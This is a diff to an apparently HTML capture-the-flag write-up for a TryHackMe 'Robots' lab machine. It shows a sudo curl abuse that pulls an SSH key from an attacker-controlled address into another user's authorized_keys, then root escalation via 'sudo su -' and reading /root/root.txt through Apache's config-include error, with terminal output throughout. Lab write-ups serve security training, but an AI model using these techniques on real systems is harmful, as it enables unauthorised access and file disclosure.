@@ -259,6 +259,34 @@ User rgiskard may run the following commands on ubuntu-jammy:
 THM{9b17d3c3e86c944c868c57b5a7fa07d8}rgiskard@ubuntu-jammy:/home$</code></pre>
 <pre><code>me$ sudo -u dolivaw /usr/bin/curl 127.0.0.1/ http://192.168.137.45/id_ed25^C9.pub -o /tmp/1 -o /home/dolivaw/.ssh/authorized_keys<div>rgiskard@ubuntu-jammy:/home$ sudo -u dolivaw /usr/bin/curl 127.0.0.1/ http://192.168.137.45/id_ed25519.pub -o /tmp/1 -o /home/dolivaw/.ssh/authorized_keys</div><div>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</div><div>                                 Dload  Upload   Total   Spent    Left  Speed</div><div>100   274  100   274    0     0  51610      0 --:--:-- --:--:-- --:--:-- 54800</div><div>  % Total    % Received % Xferd  Average Speed   Time    Time     Time  Current</div><div>                                 Dload  Upload   Total   Spent    Left  Speed</div><div>100    94  100    94    0     0   1144      0 --:--:-- --:--:-- --:--:--  1146</div><div>rgiskard@ubuntu-jammy:/home$ chmod 600 id_ed25519</div><div>ssh -i id_ed25519 dolivaw@robots.thm</div><div>chmod: cannot access 'id_ed25519': No such file or directory</div><div>Warning: Identity file id_ed25519 not accessible: No such file or directory.</div><div>ssh: Could not resolve hostname robots.thm: Name or service not known</div><div>rgiskard@ubuntu-jammy:/home$ ls</div><div>dolivaw  rgiskard  vagrant</div><div>rgiskard@ubuntu-jammy:/home$ cd /tmp</div><div>rgiskard@ubuntu-jammy:/tmp$ ls</div><div><span class="important-text">1 </span>                systemd-private-674856f1936d4f91a6266404158d9f55-apache2.service-sXzmPW         systemd-private-674856f1936d4f91a6266404158d9f55-systemd-resolved.service-YP5Wee</div><div>snap-private-tmp  systemd-private-674856f1936d4f91a6266404158d9f55-systemd-logind.service-EJfj8b  systemd-private-674856f1936d4f91a6266404158d9f55-systemd-timesyncd.service-xMxChm</div><div><br></div><div><br></div><div><br></div><div><br></div><div>                                                                                                                    </div><div><br></div><div>root in THM/MAChines/Robots via 🐘 v8.4.27 took 6m18s </div><div>❯  ssh -i id_ed25519 dolivaw@robots.thm</div><div>** WARNING: connection is not using a post-quantum key exchange algorithm.</div><div>** This session may be vulnerable to "store now, decrypt later" attacks.</div><div>** The server may need to be upgraded. See https://openssh.com/pq.html</div><div>dolivaw@ubuntu-jammy:~$ </div><div><br></div></code></pre>
 
+<h2>Privilege Escalation to Root</h2>
+<div class="note"><strong>Note:</strong> The dolivaw account can run every command as root without a password, so <code>sudo su -</code> provides an immediate root shell. The Apache permission also offers a file-disclosure technique: including a protected file as configuration makes Apache reveal its first line in the resulting syntax error.</div>
+<pre><code>dolivaw@ubuntu-jammy:~$ sudo -l
+Matching Defaults entries for dolivaw on ubuntu-jammy:
+    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
+
+User dolivaw may run the following commands on ubuntu-jammy:
+    (ALL) NOPASSWD: /usr/sbin/apache2
+    (ALL) NOPASSWD: ALL
+dolivaw@ubuntu-jammy:~$ sudo su -
+root@ubuntu-jammy:~# id
+uid=0(root) gid=0(root) groups=0(root)
+root@ubuntu-jammy:~# wc -c /root/root.txt
+37 /root/root.txt
+
+dolivaw@ubuntu-jammy:~$ sudo /usr/sbin/apache2 -C &#39;Include /root/root.txt&#39; -k stop
+[Mon Mar 17 00:06:00.171999 2025] [core:warn] [pid 1813] AH00111: Config variable ${APACHE_RUN_DIR} is not defined
+apache2: Syntax error on line 80 of /etc/apache2/apache2.conf: DefaultRuntimeDir must be a valid directory, absolute or relative to ServerRoot
+dolivaw@ubuntu-jammy:~$ sudo /usr/sbin/apache2 -C &#39;Define APACHE_RUN_DIR /tmp&#39; -C &#39;Include /root/root.txt&#39; -k stop
+[Mon Mar 17 00:07:27.943748 2025] [core:warn] [pid 1816] AH00111: Config variable ${APACHE_PID_FILE} is not defined
+[Mon Mar 17 00:07:27.943839 2025] [core:warn] [pid 1816] AH00111: Config variable ${APACHE_RUN_USER} is not defined
+[Mon Mar 17 00:07:27.943847 2025] [core:warn] [pid 1816] AH00111: Config variable ${APACHE_RUN_GROUP} is not defined
+[Mon Mar 17 00:07:27.943862 2025] [core:warn] [pid 1816] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Mon Mar 17 00:07:27.951625 2025] [core:warn] [pid 1816:tid 140193100588928] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Mon Mar 17 00:07:27.952035 2025] [core:warn] [pid 1816:tid 140193100588928] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+[Mon Mar 17 00:07:27.952070 2025] [core:warn] [pid 1816:tid 140193100588928] AH00111: Config variable ${APACHE_LOG_DIR} is not defined
+AH00526: Syntax error on line 1 of /root/root.txt:
+Invalid command &#39;THM{[REDACTED]}&#39;, perhaps misspelled or defined by a module not included in the server configuration</code></pre>
 </article>
 </body>
 </html>
